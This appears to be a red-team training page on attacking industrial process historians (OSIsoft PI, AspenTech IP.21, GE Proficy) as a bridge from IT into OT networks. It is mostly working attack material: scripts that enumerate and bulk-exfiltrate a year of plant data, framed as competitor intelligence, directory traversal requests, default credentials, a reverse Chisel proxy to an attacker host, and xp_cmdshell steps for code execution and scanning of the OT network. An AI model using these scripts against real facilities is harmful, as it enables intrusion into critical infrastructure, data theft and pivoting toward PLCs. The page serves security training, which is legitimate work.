---
layout: training-page
title: "Historian Server Attacks — Red Team Academy"
module: "OT/ICS Security"
tags:
  - historian
  - osisoft-pi
  - process-data
  - it-ot-bridge
  - data-exfiltration
page_key: "ot-ics-historian-attacks"
render_with_liquid: false
---

# Historian Server Attacks

Process historians are time-series databases that record every sensor reading, valve position, and control action in an industrial facility. They sit at the intersection of IT and OT networks by design — making them the single most valuable pivot point in an ICS engagement.

Attacking historians provides:
1. **Intelligence**: Years of process data reveals how the plant operates
2. **Pivot access**: Direct network paths to OT devices the historian polls
3. **Credentials**: Stored service accounts with PLC/device access
4. **Disruption potential**: Corrupting historical data impacts compliance, billing, and process optimization

---

## OSIsoft PI System Architecture

OSIsoft PI (now AVEVA PI System) is the dominant historian globally, with deployments in 65%+ of power utilities, refineries, chemical plants, and water treatment facilities worldwide.

```
PI System Architecture:

[PI Data Archive Server]          [PI Asset Framework (PI AF) Server]
├── PI Data Archive (time-series) ├── PI AF Database (asset hierarchy)
├── PI SDK / AFSDK                ├── PI Analysis Service
├── PI Buffer Subsystem           └── PI Notifications
└── PI Interfaces/Connectors
        │
        │  Protocol-specific interfaces:
        ├── PI Modbus Interface → PLCs via Modbus TCP
        ├── PI OPC Interface → OPC-DA/UA servers
        ├── PI DNP3 Interface → RTUs
        └── PI API Interface → Custom applications

[PI Web API]                      [PI Vision (Web HMI)]
├── REST API (TCP 443)            ├── Silverlight (legacy)
└── OData endpoint                └── HTML5 interface

[PI Integrator for Business Analytics]
└── Pushes data to SQL Server, Azure, SAP
```

### PI System Network Ports

| Port | Service | Notes |
|------|---------|-------|
| 5450 | PI Network Manager | Legacy PI connectivity |
| 5452 | PI Data Archive (PINet) | Legacy API connectivity |
| 5461 | PI Data Archive | Modern PI SDK connectivity |
| 443/8443 | PI Web API | REST API, HTTPS |
| 5462 | PI Buffer Subsystem | |
| 5468 | PI AF | Asset Framework connectivity |
| 1433 | SQL Server | PI AF uses SQL Server backend |

---

## PI Web API: Unauthenticated Access

PI Web API is a RESTful interface providing access to all PI data. Many installations have weak or no authentication on internal interfaces.

### Discovery and Enumeration

```bash
# Discover PI Web API endpoints
nmap -sV -p 443,8443,5461,5450 --script=http-title <target>

# PI Web API root endpoint reveals configuration
curl -sk https://192.168.1.100/piwebapi/
# Returns JSON describing PI system, version, authentication method

# Check authentication requirements
curl -sk -v https://192.168.1.100/piwebapi/system 2>&1 | grep -i "www-authenticate\|unauthorized\|200 OK"

# If Windows authentication (NTLM/Kerberos) with valid domain credentials:
curl -sk --ntlm -u "DOMAIN\username:password" https://192.168.1.100/piwebapi/system

# If anonymous access is allowed (misconfigured PI Web API):
curl -sk https://192.168.1.100/piwebapi/dataservers
```

### PI Web API — Complete Data Extraction

```python
#!/usr/bin/env python3
# pi_web_api_attack.py — OSIsoft PI Web API data extraction
import requests
import json
from datetime import datetime, timedelta

class PIWebAPIClient:
    def __init__(self, base_url, username=None, password=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        if username:
            self.session.auth = requests.auth.HTTPBasicAuth(username, password)
    
    def get_system_info(self):
        """Get PI system information"""
        r = self.session.get(f"{self.base_url}/system")
        return r.json()
    
    def list_data_servers(self):
        """List all PI Data Archive servers"""
        r = self.session.get(f"{self.base_url}/dataservers")
        return r.json().get('Items', [])
    
    def list_all_points(self, server_webid, max_count=10000):
        """Enumerate ALL PI tags (points) on a server"""
        points = []
        start = 0
        while True:
            r = self.session.get(
                f"{self.base_url}/dataservers/{server_webid}/points",
                params={'startIndex': start, 'maxCount': 100}
            )
            data = r.json()
            items = data.get('Items', [])
            if not items:
                break
            points.extend(items)
            start += len(items)
            if start >= max_count:
                break
        return points
    
    def get_tag_current_value(self, tag_webid):
        """Read current value of a PI tag"""
        r = self.session.get(f"{self.base_url}/streams/{tag_webid}/value")
        return r.json()
    
    def get_tag_history(self, tag_webid, start_time="*-7d", end_time="*"):
        """Read historical data for a PI tag"""
        r = self.session.get(
            f"{self.base_url}/streams/{tag_webid}/recorded",
            params={'startTime': start_time, 'endTime': end_time, 'maxCount': 1000}
        )
        return r.json().get('Items', [])
    
    def bulk_read_current_values(self, tag_webids):
        """Read current values for multiple tags at once"""
        payload = {
            "Items": [{"WebId": wid} for wid in tag_webids]
        }
        r = self.session.post(
            f"{self.base_url}/streamsets/value",
            json=payload
        )
        return r.json()

def attack_pi_system(pi_server):
    print(f"[*] Attacking PI System: {pi_server}")
    client = PIWebAPIClient(f"https://{pi_server}/piwebapi")
    
    # Step 1: Get system info
    info = client.get_system_info()
    print(f"[+] PI System: {info.get('ProductTitle', 'Unknown')}")
    print(f"    Version: {info.get('ProductVersion', 'Unknown')}")
    
    # Step 2: Enumerate data servers
    servers = client.list_data_servers()
    print(f"[+] Found {len(servers)} PI Data Archive servers")
    
    for server in servers:
        print(f"\n[*] Server: {server['Name']} ({server['IsConnected']})")
        server_webid = server['WebId']
        
        # Step 3: Dump all tags
        print("    [*] Enumerating all PI tags...")
        points = client.list_all_points(server_webid)
        print(f"    [+] Found {len(points)} tags")
        
        # Step 4: Show tag categories (reveals plant operations)
        print("\n    [*] Sample tags (reveals plant structure):")
        for point in points[:20]:
            print(f"      {point['Name']:40} | {point.get('EngUnits', ''):10} | {point.get('Descriptor', '')[:30]}")
        
        # Step 5: Save full tag list to file
        with open(f"pi_tags_{server['Name']}.json", 'w') as f:
            json.dump(points, f, indent=2)
        print(f"\n    [+] Full tag list saved to pi_tags_{server['Name']}.json")
        
        # Step 6: Read current values for all tags
        print("\n    [*] Reading current process values...")
        webids = [p['WebId'] for p in points[:100]]
        current_values = client.bulk_read_current_values(webids)
        
        for i, item in enumerate(current_values.get('Items', [])[:10]):
            point = points[i]
            value = item.get('Value', {})
            print(f"      {point['Name']:40} = {value.get('Value', 'Error'):>12} {point.get('EngUnits', '')}")

if __name__ == "__main__":
    attack_pi_system("192.168.1.100")
```

---

## PI SQL Injection via PI OLEDB Provider

PI System provides a SQL interface via PI OLEDB Provider (allows SQL queries against PI data using ANSI SQL with PI-specific extensions).

### PI SQL Query Structure

```sql
-- Connect via PI OLEDB: Provider=PIOleDb.1;Data Source=<pi_server>
-- PI tag data is accessible as SQL tables

-- List all tags
SELECT tag, descriptor, engunits, step, typicalvalue
FROM pipoint..pipoint2

-- Read historical data for a specific tag
SELECT tag, time, value, status
FROM piarchive..picomp2
WHERE tag = 'REACTOR_3_TEMP'
  AND time > '2024-01-01'
  AND time < '2024-12-31'
  AND time2 > time
ORDER BY time DESC

-- Get all tags matching a pattern (enumerate plant)
SELECT tag, descriptor, engunits
FROM pipoint..pipoint2
WHERE tag LIKE '%FLOW%' OR tag LIKE '%LEVEL%' OR tag LIKE '%TEMP%'
ORDER BY tag
```

### Injecting via PI SQL Commander

```python
#!/usr/bin/env python3
# Test for SQL injection via PI OLEDB/PI SQL Commander
import subprocess
import pyodbc  # pip install pyodbc

def connect_pi_sql(pi_server, domain=None, username=None, password=None):
    """Connect to PI via OLEDB (requires PI client installed)"""
    if username:
        conn_str = (
            f"DRIVER={{PI OLEDB Provider}};"
            f"Data Source={pi_server};"
            f"User ID={domain}\\{username};"
            f"Password={password};"
        )
    else:
        conn_str = (
            f"DRIVER={{PI OLEDB Provider}};"
            f"Data Source={pi_server};"
            f"Integrated Security=SSPI;"
        )
    return pyodbc.connect(conn_str)

def enumerate_pi_via_sql(pi_server):
    conn = connect_pi_sql(pi_server)
    cursor = conn.cursor()
    
    print("[*] Enumerating PI system via SQL interface")
    
    # Get PI server version
    cursor.execute("SELECT @@VERSION")
    print(f"[+] PI Version: {cursor.fetchone()[0]}")
    
    # Enumerate all PI tags
    cursor.execute("""
        SELECT tag, descriptor, engunits, typicalvalue, pointtype
        FROM pipoint..pipoint2
        ORDER BY tag
    """)
    
    print(f"\n[+] PI Tags:")
    for row in cursor.fetchmany(50):
        print(f"  {row[0]:40} | {row[2]:8} | {row[1][:30]}")
    
    # Extract a week of process data for key tags
    cursor.execute("""
        SELECT tag, time, value
        FROM piarchive..picomp2
        WHERE tag LIKE 'REACTOR%'
          AND time > '2024-01-01'
          AND time < '2024-01-08'
          AND time2 > time
        ORDER BY time
    """)
    
    print(f"\n[+] Historical Process Data (Reactor tags, last week):")
    for row in cursor.fetchmany(100):
        print(f"  {row[0]:30} | {row[1]} | {row[2]}")
    
    conn.close()
```

---

## PI System Explorer: Intelligence Gathering

```bash
# PI System Explorer (PIE) provides hierarchical asset browsing
# After authenticating to PI Web API, the AF database reveals:
# - Asset hierarchy (Unit → Equipment → Instruments)
# - Element templates (standard process unit configurations)
# - Event frames (recorded process events, batches, alarms)
# - Analyses (calculated KPIs)

# Browse AF hierarchy via Web API
curl -sk https://192.168.1.100/piwebapi/assetservers

# Get all elements (asset hierarchy)
curl -sk "https://192.168.1.100/piwebapi/assetdatabases/{db_webid}/elements?searchFullHierarchy=true"

# Get event frames (process events, batch records)
# Event frames reveal: when processes ran, batch IDs, product grades
curl -sk "https://192.168.1.100/piwebapi/assetdatabases/{db_webid}/eventframes?startTime=*-30d&endTime=*"

# This reveals:
# - Production schedule (what they make, when, how much)
# - Process upset events (when things went wrong)
# - Maintenance windows
# - Product quality data
```

---

## AspenTech InfoPlus.21

AspenTech IP.21 (InfoPlus.21) is common in refineries and chemical plants.

```bash
# IP.21 uses TCP port 10014 (Aspen SQLPlus)
nmap -p 10014 --script=aspen-sqlplus-info <target>

# Aspen SQLPlus connection (SQL-like interface)
# Driver: AspenTech SQLplus ODBC Driver

# Example query syntax (IP.21 SQL):
SELECT IP_TAG_NAME, IP_TREND_VALUE, IP_DESCRIPTION 
FROM IP_AnalogDef
WHERE IP_TAG_NAME LIKE 'UNIT3%'

# Historical data
SELECT IP_TAG_NAME, IP_DATE, IP_VALUE
FROM IP_AnalogDef
WHERE IP_DATE >= '2024-01-01'

# IP.21 web interface: typically port 80 on the IP.21 server
# Default credentials: Administrator / (blank) or admin / admin
curl -s http://192.168.1.100/AspenTech/
```

---

## GE Proficy Historian

Common in power generation, automotive manufacturing.

### CVE Catalog

| CVE | Description | CVSS |
|-----|-------------|------|
| CVE-2014-2355 | Directory traversal in Proficy Historian web API | 7.5 |
| CVE-2016-5787 | Buffer overflow in Proficy HDA OPC server | 9.8 |
| CVE-2018-10952 | Proficy Machine Edition: RCE via malformed packet | 9.8 |
| CVE-2022-29953 | GE Proficy: improper input validation → RCE | 9.8 |

```bash
# GE Proficy Historian uses:
# TCP 14000 (HDA data)
# TCP 14001 (OPC-HDA)
# TCP 14002 (UA - Proficy Gateway)

nmap -sV -p 14000,14001,14002 <target>

# Directory traversal (CVE-2014-2355)
# Proficy Historian web interface runs on port 80/443
curl "http://192.168.1.100/proficy/../../../../../windows/win.ini"
curl "http://192.168.1.100/proficy/..%2F..%2F..%2Fwindows%2Fwin.ini"

# Check for default admin panel
curl -s http://192.168.1.100/proficy/historian/
# Look for: login page, API endpoints
```

---

## Historian as IT/OT Bridge

The historian's dual-homed nature makes it the ideal pivot:

```bash
# After compromising the historian:

# 1. Identify network interfaces (IT + OT)
Get-NetIPConfiguration | Select InterfaceAlias, IPv4Address

# Typical output:
# Ethernet0 (IT) : 192.168.1.100
# Ethernet1 (OT) : 10.0.1.100

# 2. Enumerate OT network from historian
# Using PI interfaces as a guide — they know exactly which PLCs exist
# PI Network Manager shows all connected PI interfaces:
Get-Service -Name "PI*" | Format-List Name, Status, DisplayName

# 3. Check PI interface logs to find device IPs
Get-Content "C:\Program Files\PIPC\interfaces\*.log" | 
  Select-String -Pattern "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

# 4. PI Interface configuration reveals ALL connected PLCs
# Modbus interface config:
type "C:\Program Files\PIPC\interfaces\Modbus\*.ini"
# Contains: IP addresses and Modbus addresses of all connected PLCs

# OPC interface config:
type "C:\Program Files\PIPC\interfaces\OPC\*.ini"
# Contains: OPC server names, which point to specific HMIs/PLCs

# 5. Set up pivot using historian's OT network access
# Chisel SOCKS proxy
./chisel server -p 8888 --reverse &
.\chisel.exe client <attacker_ip>:8888 R:socks

# 6. Attack PLCs through historian's established network paths
proxychains python3 plc_enum.py 10.0.1.1
```

---

## Data Exfiltration: Years of Process Data

The intelligence value of process historian data is immense:

```python
#!/usr/bin/env python3
# pi_data_exfiltration.py — Extract years of process data
# This data reveals: production volumes, efficiency trends, raw material usage,
#                    process upsets, equipment health, product quality

import requests
import json
import csv
from datetime import datetime, timedelta

def exfiltrate_pi_data(pi_server, output_file="plant_data_export.csv"):
    """
    Extract complete historical dataset from PI System
    Reveals: production rates, process conditions, equipment states
    """
    session = requests.Session()
    session.verify = False
    
    base_url = f"https://{pi_server}/piwebapi"
    
    # Get all PI tags
    servers = session.get(f"{base_url}/dataservers").json()['Items']
    server_webid = servers[0]['WebId']
    
    print(f"[*] Extracting PI tags...")
    all_points = []
    r = session.get(f"{base_url}/dataservers/{server_webid}/points",
                    params={'maxCount': 10000})
    all_points = r.json().get('Items', [])
    print(f"[+] Found {len(all_points)} tags to exfiltrate")
    
    # Write to CSV
    with open(output_file, 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(['Tag', 'Timestamp', 'Value', 'Quality', 'Units', 'Description'])
        
        # Extract 1 year of data for critical tags
        for point in all_points:
            tag_name = point['Name']
            tag_webid = point['WebId']
            
            try:
                # Get 1 year of recorded values (compressed/archived)
                history = session.get(
                    f"{base_url}/streams/{tag_webid}/recorded",
                    params={
                        'startTime': '*-365d',
                        'endTime': '*',
                        'maxCount': 50000
                    }
                ).json().get('Items', [])
                
                for h in history:
                    writer.writerow([
                        tag_name,
                        h.get('Timestamp', ''),
                        h.get('Value', {}).get('Value', '') if isinstance(h.get('Value'), dict) else h.get('Value', ''),
                        h.get('Value', {}).get('Name', 'Good') if isinstance(h.get('Value'), dict) else 'Good',
                        point.get('EngUnits', ''),
                        point.get('Descriptor', '')
                    ])
                
                print(f"  [+] {tag_name}: {len(history)} records extracted")
            except Exception as e:
                print(f"  [-] {tag_name}: {e}")
    
    print(f"\n[+] Exfiltration complete: {output_file}")
    print(f"    This file contains complete plant operational history")
    print(f"    Competitor intelligence value: CRITICAL")
```

---

## Pivoting: SQL Server Backend Exploitation

Most historians use Microsoft SQL Server as their backend database.

```bash
# PI System AF uses SQL Server database named "PIFD"
# PI Asset Framework data (asset hierarchy, configurations)
nmap -p 1433 <historian_ip>

# Connect to SQL Server backend
mssqlclient.py 'HISTORIAN\piaf_svc'@192.168.1.100 -windows-auth

# Enumerate PI databases
SQL> SELECT name FROM master.dbo.sysdatabases WHERE name LIKE 'PI%';
# Result: PIFD, PIAFSqlServiceDatabase, PIABF

# Explore PI AF database (asset hierarchy)
SQL> USE PIFD;
SQL> SELECT * FROM Element ORDER BY Path;
SQL> SELECT * FROM ElementTemplate;

# Check for SQL Server Agent jobs (may run privileged commands)
SQL> SELECT name, enabled, command FROM msdb.dbo.sysjobs j
     JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id;

# Attempt xp_cmdshell for RCE if SA or sysadmin privileges
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';

# If successful, you have code execution on historian server
# With historian's OT network access
SQL> EXEC xp_cmdshell 'ping -n 1 10.0.1.1';  # Test OT reachability
SQL> EXEC xp_cmdshell 'powershell -c "1..254 | ForEach-Object { Test-Connection 10.0.1.$_ -Count 1 -Quiet }"';
```

---

## MITRE ATT&CK Techniques for Historian Attacks

| Technique | ID | Application |
|-----------|-----|------------|
| Data from Information Repositories | T0811 | Exfiltrating PI historian tag data |
| Automated Collection | T0802 | Scripted bulk export of process data |
| Network Connection Enumeration | T0840 | Using historian's OT connections for discovery |
| Exploitation of Remote Services | T0866 | Exploiting PI Web API, SQL Server |
| Valid Accounts | T0859 | Using stolen historian service account creds |
| Lateral Tool Transfer | T0867 | Staging attack tools on historian for OT pivoting |

---

*Next: [ICS/OT Red Team Tool Reference](ics-tools.md)*
